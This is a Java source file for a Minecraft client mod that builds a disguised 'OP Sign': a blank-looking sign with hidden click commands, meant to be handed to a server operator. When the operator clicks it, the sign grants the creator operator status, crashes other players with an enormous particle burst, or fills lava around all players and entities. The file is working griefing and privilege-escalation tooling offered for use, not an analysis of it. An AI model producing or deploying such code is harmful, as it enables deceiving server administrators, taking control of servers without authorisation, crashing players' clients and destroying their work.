package modes;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.CyclingButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.component.ComponentChanges;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Unique;

public class CustomMenuScreen extends Screen {
    private final Screen parent;

    public CustomMenuScreen(Screen parent) {
        super(Text.literal("Custom Menu"));
        this.parent = parent;
    }
    @Unique
    private final MinecraftClient mc = MinecraftClient.getInstance();
    @Unique
    private Modes currentMode = Modes.ForceOP;
    @Unique
    private boolean skynet = false;
    @Unique
    private boolean crashpeople = false;
    @Unique
    private TextFieldWidget command1Field;
    @Unique
    private TextFieldWidget command2Field;
    @Unique
    private TextFieldWidget command3Field;
    @Unique
    private TextFieldWidget command4Field;
    @Unique
    private TextFieldWidget eterminateWidthField;
    @Unique
    private TextFieldWidget eterminateHeightField;
    @Unique
    private TextFieldWidget eterminateDepthField;
    @Unique
    private TextFieldWidget terminateWidthField;
    @Unique
    private TextFieldWidget terminateHeightField;
    @Unique
    private TextFieldWidget terminateDepthField;
    @Unique
    private TextFieldWidget etBlockNameField;
    @Unique
    private TextFieldWidget tBlockNameField;
    @Unique
    private TextFieldWidget cloneField;
    @Unique
    private CyclingButtonWidget<Modes> modeButton;
    @Override
    protected void init() {
        super.init();
        int leftColumn = 140;
        int rightColumn = 320;
        int startY = height / 4;
        int spacing = 18;

        modeButton = CyclingButtonWidget.<Modes>builder(mode -> Text.literal(mode.name()))
                .values(Modes.values())
                .initially(currentMode)
                .build(leftColumn, startY + spacing, 170, 18, Text.literal("Cmd 1: Mode"));
        addDrawableChild(modeButton);

        addDrawableChild(new ButtonWidget.Builder(Text.literal("Cmd 2: Crash People: OFF"), this::toggleCrashPeople)
                .position(leftColumn, startY + spacing * 2)
                .size(170, 18)
                .build()
        );

        addDrawableChild(new ButtonWidget.Builder(Text.literal("Cmd 3+4: Grief Server: OFF"), this::toggleSkynet)
                .position(leftColumn, startY + spacing * 3)
                .size(170, 18)
                .build()
        );

        addDrawableChild(new ButtonWidget.Builder(Text.literal("------>Create OP Sign<------"), button -> createOpSign())
                .position(leftColumn + 90, startY + 185)
                .size(170, 18)
                .build()
        );

        addDrawableChild(new ButtonWidget.Builder(Text.literal("BACK"), button -> mc.setScreen(parent))
                .position(leftColumn, startY + 185)
                .size(50, 18)
                .build()
        );

        addDrawableChild(new ButtonWidget.Builder(Text.literal("Clone Sign Y:"), button -> {})
                .position(leftColumn, startY + spacing * 4)
                .size(75, 18)
                .build());

        TextFieldWidget cloneYField = new TextFieldWidget(textRenderer, leftColumn + 80, startY + spacing * 4, 90, 18, Text.literal("Clone Y Level"));
        cloneYField.setMaxLength(256);
        cloneYField.setText("255");
        cloneYField.setChangedListener(this::onCloneYChanged);
        addDrawableChild(cloneYField);
        cloneField = cloneYField;

        for (int i = 0; i < 4; i++) {
            int yPos = startY + spacing + spacing * (5 + i);

            addDrawableChild(new ButtonWidget.Builder(Text.literal("Cmd " + (i + 1) + ":"), button -> {})
                    .position(leftColumn, yPos)
                    .size(45, 18)
                    .build());

            TextFieldWidget commandField = new TextFieldWidget(textRenderer, leftColumn + 50, yPos, 120, 18, Text.literal("Command " + (i + 1)));
            commandField.setMaxLength(256);
            int finalI = i;
            commandField.setChangedListener(newText -> onCommandChanged(finalI, newText));
            addDrawableChild(commandField);

            switch (i) {
                case 0 -> command1Field = commandField;
                case 1 -> command2Field = commandField;
                case 2 -> command3Field = commandField;
                case 3 -> command4Field = commandField;
            }
        }

        addDrawableChild(new ButtonWidget.Builder(Text.literal("§n§lGrief Server Options:"), button -> {})
                .position(rightColumn, startY)
                .size(170, 18)
                .build());
        addDrawableChild(new ButtonWidget.Builder(Text.literal("§n§lCommand Options:"), button -> {})
                .position(leftColumn, startY)
                .size(170, 18)
                .build());

        String[] terminateLabels = {"Width:", "Height:", "Depth:", "Block:"};
        TextFieldWidget[] eterminateFields = new TextFieldWidget[4];

        for (int i = 0; i < terminateLabels.length; i++) {
            int yPos = startY + spacing * (i + 1);

            addDrawableChild(new ButtonWidget.Builder(Text.literal("E" + terminateLabels[i]), button -> {})
                    .position(rightColumn, yPos)
                    .size(50, 18)
                    .build());

            String defaultValue = "";
            if (terminateLabels[i] == "Width:") defaultValue = "5";
            if (terminateLabels[i] == "Height:") defaultValue = "1";
            if (terminateLabels[i] == "Depth:") defaultValue = "5";
            if (terminateLabels[i] == "Block:") defaultValue = "lava";

            TextFieldWidget field = new TextFieldWidget(textRenderer, rightColumn + 55, yPos, 115, 18, Text.literal("Eterminate " + terminateLabels[i]));
            field.setMaxLength(256);
            field.setText(defaultValue);
            int finalI = i;
            field.setChangedListener(newText -> onEterminateChanged(finalI, newText));
            addDrawableChild(field);
            eterminateFields[i] = field;
        }

        eterminateWidthField = eterminateFields[0];
        eterminateHeightField = eterminateFields[1];
        eterminateDepthField = eterminateFields[2];
        etBlockNameField = eterminateFields[3];

        TextFieldWidget[] terminateFields = new TextFieldWidget[4];

        for (int i = 0; i < terminateLabels.length; i++) {
            int yPos = startY + spacing * (i + 6);

            addDrawableChild(new ButtonWidget.Builder(Text.literal("P" + terminateLabels[i]), button -> {})
                    .position(rightColumn, yPos)
                    .size(50, 18)
                    .build());

            String defaultValue = "";
            if (terminateLabels[i] == "Width:") defaultValue = "45";
            if (terminateLabels[i] == "Height:") defaultValue = "1";
            if (terminateLabels[i] == "Depth:") defaultValue = "45";
            if (terminateLabels[i] == "Block:") defaultValue = "lava";

            TextFieldWidget field = new TextFieldWidget(textRenderer, rightColumn + 55, yPos, 115, 18, Text.literal("Terminate " + terminateLabels[i]));
            field.setMaxLength(256);
            field.setText(defaultValue);
            int finalI = i;
            field.setChangedListener(newText -> onTerminateChanged(finalI, newText));
            addDrawableChild(field);
            terminateFields[i] = field;
        }

        terminateWidthField = terminateFields[0];
        terminateHeightField = terminateFields[1];
        terminateDepthField = terminateFields[2];
        tBlockNameField = terminateFields[3];
    }
    @Unique
    private void toggleSkynet(ButtonWidget button) {
        skynet = !skynet;
        button.setMessage(Text.literal("Cmd 3+4: Grief Server: " + (skynet ? "ON" : "OFF")));
    }

    @Unique
    private void toggleCrashPeople(ButtonWidget button) {
        crashpeople = !crashpeople;
        button.setMessage(Text.literal("Cmd 2: Crash People: " + (crashpeople ? "ON" : "OFF")));
    }
    @Unique
    private String command1Value = "";
    @Unique
    private String command2Value = "";
    @Unique
    private String command3Value = "";
    @Unique
    private String command4Value = "";
    @Unique
    private String eterminateWidthValue = "5";
    @Unique
    private String eterminateHeightValue = "1";
    @Unique
    private String eterminateDepthValue = "5";
    @Unique
    private String terminateWidthValue = "45";
    @Unique
    private String terminateHeightValue = "1";
    @Unique
    private String terminateDepthValue = "45";
    @Unique
    private String etBlockNameValue = "lava";
    @Unique
    private String tBlockNameValue = "lava";
    @Unique
    private String cloneYValue = "255";
    @Unique
    private TextFieldWidget[] getCustomFields() {
        return new TextFieldWidget[]{
                command1Field, command2Field, command3Field, command4Field,
                eterminateWidthField, eterminateHeightField, eterminateDepthField,
                etBlockNameField, terminateWidthField, terminateHeightField,
                terminateDepthField, tBlockNameField, cloneField
        };
    }
    @Override
    public boolean mouseClicked(double mouseX, double mouseY, int button) {
        boolean clickedCustomField = false;
        for (TextFieldWidget field : getCustomFields()) {
            if (field == null) return super.mouseClicked(mouseX, mouseY, button);
            if (field.isMouseOver(mouseX, mouseY)) {
                field.setFocused(true);
                clickedCustomField = true;
            } else {
                field.setFocused(false);
            }
        }

        return clickedCustomField || super.mouseClicked(mouseX, mouseY, button);
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        for (TextFieldWidget field : getCustomFields()) {
            if (field == null) return super.keyPressed(keyCode, scanCode, modifiers);
            if (field.isFocused()) {
                return field.keyPressed(keyCode, scanCode, modifiers);
            }
        }

        return super.keyPressed(keyCode, scanCode, modifiers);
    }

    @Override
    public boolean charTyped(char chr, int modifiers) {
        for (TextFieldWidget field : getCustomFields()) {
            if (field == null) return super.charTyped(chr, modifiers);
            if (field.isFocused()) {
                return field.charTyped(chr, modifiers);
            }
        }

        return super.charTyped(chr, modifiers);
    }

    @Unique
    private void onCommandChanged(int index, String newText) {
        switch (index) {
            case 0 -> command1Value = newText;
            case 1 -> command2Value = newText;
            case 2 -> command3Value = newText;
            case 3 -> command4Value = newText;
        }
    }
    @Unique
    private void onEterminateChanged(int index, String newText) {
        switch (index) {
            case 0 -> eterminateWidthValue = newText;
            case 1 -> eterminateHeightValue = newText;
            case 2 -> eterminateDepthValue = newText;
            case 3 -> etBlockNameValue = newText;
        }
    }
    @Unique
    private void onTerminateChanged(int index, String newText) {
        switch (index) {
            case 0 -> terminateWidthValue = newText;
            case 1 -> terminateHeightValue = newText;
            case 2 -> terminateDepthValue = newText;
            case 3 -> tBlockNameValue = newText;
        }
    }
    @Unique
    private void onCloneYChanged(String newText) {
        cloneYValue = newText;
    }
    @Unique
    private void createOpSign() {
        assert mc.player != null;
        if (!mc.player.getAbilities().creativeMode) {
            mc.inGameHud.getChatHud().addMessage(Text.literal("You need creative mode to make the sign."));
            return;
        }

        ItemStack stack = new ItemStack(Items.OAK_SIGN);
        NbtCompound blockEntityTag = new NbtCompound();
        NbtCompound text = new NbtCompound();
        NbtCompound text2 = new NbtCompound();
        NbtList messages = new NbtList();

        NbtCompound firstLine = new NbtCompound();
        NbtCompound secondLine = new NbtCompound();
        NbtCompound thirdLine = new NbtCompound();
        NbtCompound fourthLine = new NbtCompound();
        //thank you to Rob https://github.com/xnite for figuring out to use a newline character to make a blank sign. sneak level 100 achieved
        firstLine.putString("text", "\n");
        secondLine.putString("text", "\n");
        thirdLine.putString("text", "\n");
        fourthLine.putString("text", "\n");

        NbtCompound clickEvent1 = new NbtCompound();
        NbtCompound clickEvent2 = new NbtCompound();
        NbtCompound clickEvent3 = new NbtCompound();
        NbtCompound clickEvent4 = new NbtCompound();

        String commandValue1 = command1Value;
        String commandValue2 = command2Value;
        String commandValue3 = command3Value;
        String commandValue4 = command4Value;
        String eterminatewidth = eterminateWidthValue;
        String eterminateheight = eterminateHeightValue;
        String eterminatedepth = eterminateDepthValue;
        String terminatewidth = terminateWidthValue;
        String terminateheight = terminateHeightValue;
        String terminatedepth = terminateDepthValue;
        String etBlockName = etBlockNameValue;
        String tBlockName = tBlockNameValue;
        String cloneSignValue = cloneYValue;

        Modes selectedMode = modeButton.getValue();
        switch (selectedMode) {
            case ForceOP -> commandValue1 = "op " + mc.player.getName().getLiteralString();
            case CloneSign ->
                    commandValue1 = "clone ~ ~ ~ ~ ~ ~ to minecraft:overworld ~ " + cloneSignValue + " ~ replace force";
            case AnyCommand -> {
                if (commandValue1.startsWith("/")) {
                    commandValue1 = commandValue1.substring(1);
                }
            }
        }
        if (crashpeople) commandValue2 = "execute as @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[name=!"+mc.player.getName().getLiteralString()+"]";
        else {
            if (commandValue2.startsWith("/")) {
                commandValue2 = commandValue2.substring(1);
            }
        }
        if (skynet) commandValue3 = ("execute as @e at @s[name=!"+mc.player.getName().getLiteralString()+", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth + " " + "~" + eterminateheight + " " + "~" + eterminatedepth + " " + "~-" + eterminatewidth + " " + "~-" + eterminateheight + " " + "~-" + eterminatedepth + " " + etBlockName);
        else {
            if (commandValue3.startsWith("/")) {
                commandValue3 = commandValue3.substring(1);
            }
        }
        if (skynet) commandValue4 = ("execute as @a at @s[name=!"+mc.player.getName().getLiteralString()+"] run fill " + "~" + terminatewidth + " " + "~" + terminateheight + " " + "~" + terminatedepth + " " + "~-" + terminatewidth + " " + "~-" + terminateheight + " " + "~-" + terminatedepth + " " + tBlockName);
        else {
            if (commandValue4.startsWith("/")) {
                commandValue4 = commandValue4.substring(1);
            }
        }

        clickEvent1.putString("action", "run_command");
        clickEvent1.putString("value", commandValue1);
        clickEvent2.putString("action", "run_command");
        clickEvent2.putString("value", commandValue2);
        clickEvent3.putString("action", "run_command");
        clickEvent3.putString("value", commandValue3);
        clickEvent4.putString("action", "run_command");
        clickEvent4.putString("value", commandValue4);
        firstLine.put("clickEvent", clickEvent1);
        secondLine.put("clickEvent", clickEvent2);
        thirdLine.put("clickEvent", clickEvent3);
        fourthLine.put("clickEvent", clickEvent4);

        messages.add(NbtString.of(firstLine.toString()));
        messages.add(NbtString.of(secondLine.toString()));
        messages.add(NbtString.of(thirdLine.toString()));
        messages.add(NbtString.of(fourthLine.toString()));

        text.put("messages", messages);
        text2.put("messages", messages);
        blockEntityTag.put("front_text", text);
        blockEntityTag.put("back_text", text2);
        blockEntityTag.putString("id", "minecraft:oak_sign");

        var changes = ComponentChanges.builder()
                .add(DataComponentTypes.BLOCK_ENTITY_DATA, NbtComponent.of(blockEntityTag))
                .build();

        stack.applyChanges(changes);

        assert mc.interactionManager != null;
        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);
        mc.inGameHud.getChatHud().addMessage(Text.literal("OP Sign created. Give it to an operator who is in creative mode and have them click it to execute the command."));
        switch (selectedMode) {
            case ForceOP -> mc.inGameHud.getChatHud().addMessage(Text.literal("ForceOP mode selected. Cmd 1 will not be executed!"));
            case CloneSign -> mc.inGameHud.getChatHud().addMessage(Text.literal("CloneSign mode selected. Cmd 1 will not be executed!"));
        }
        if (crashpeople) mc.inGameHud.getChatHud().addMessage(Text.literal("Crash People enabled. Cmd 2 will not be executed!"));
        if (skynet) mc.inGameHud.getChatHud().addMessage(Text.literal("Crash Server enabled. Cmd 3+4 will not be executed!"));
        mc.setScreen(parent);
    }

    @Override
    public boolean shouldCloseOnEsc() {
        return true;
    }

    @Override
    public void close() {
        mc.setScreen(parent);
    }
}

